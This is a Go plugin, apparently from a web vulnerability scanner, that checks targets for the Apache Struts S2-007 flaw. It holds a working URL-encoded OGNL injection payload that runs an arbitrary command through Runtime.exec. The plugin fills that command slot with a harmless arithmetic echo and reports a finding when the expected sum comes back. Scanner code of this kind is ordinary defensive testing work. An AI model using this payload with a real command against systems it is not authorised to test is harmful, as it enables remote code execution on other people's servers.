/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

// ExecPayload007
var ExecPayload007 = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"

type S007 struct {
}

func (*S007) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			// SetHeader("Content-Type", "application/x-www-form-urlencoded").
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测S2-007, %s", flow.Request.URL())
			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			payload := strings.Replace(ExecPayload007, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			for _, param := range flow.Request.ParamsBody() {
				req := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: "", Value: payload, Suffix: ""})
				res, err := ab.HTTPClient.Respond(context.TODO(), req)
				if err != nil {
					return err
				}
				if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
					v := ab.NewWebVuln(req, res, &param)
					if v != nil {
						v.SetTargetURL(flow.Request.URL())
						v.Payload = payload
						ab.OutputVuln(v)
					}
				}
				return nil
			}
			return nil

		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{ID: "struts/s2-007/default", Plugin: "struts/s2-007/default", Category: "struts/s2-007/default"},
	}
}
